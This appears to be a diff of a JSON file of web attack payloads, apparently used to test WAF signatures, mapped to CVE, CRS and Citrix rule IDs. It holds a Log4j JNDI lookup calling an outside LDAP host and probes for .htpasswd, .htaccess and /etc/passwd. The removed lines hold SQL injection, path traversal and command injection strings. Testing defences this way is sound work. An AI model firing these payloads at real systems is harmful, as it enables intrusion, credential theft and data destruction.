@@ -2,31 +2,25 @@
     {
         "name": "Log4j JNDI injection",
         "ref": "CVE-2021-44228",
+        "citrix_id": ["999077", "999078", "999079", "999080"],
         "payload": "${jndi:ldap://example.com/a}"
     },
     {
-        "name": "SQL injection (classic)",
-        "ref": "CRS 942100",
-        "payload": "' OR '1'='1"
+        "name": ".htpasswd file",
+        "ref": "CVE-2002-0917",
+        "citrix_id": ["1071"],
+        "payload": ".htpasswd"
     },
     {
-        "name": "SQL injection (comment terminator)",
-        "ref": "CRS 942110",
-        "payload": "1; DROP TABLE users--"
+        "name": ".htaccess file",
+        "ref": "CVE-2000-0234",
+        "citrix_id": ["1129"],
+        "payload": ".htaccess"
     },
     {
-        "name": "Path traversal",
-        "ref": "CRS 930110",
-        "payload": "../../../../etc/passwd"
-    },
-    {
-        "name": "Path traversal (URL-encoded)",
-        "ref": "CRS 930120",
-        "payload": "..%2F..%2F..%2Fetc%2Fpasswd"
-    },
-    {
-        "name": "Command injection",
-        "ref": "CRS 932100",
-        "payload": "; cat /etc/passwd"
+        "name": "/etc/passwd file",
+        "ref": "CVE-2004-0303",
+        "citrix_id": ["1122"],
+        "payload": "/etc/passwd"
     }
 ]
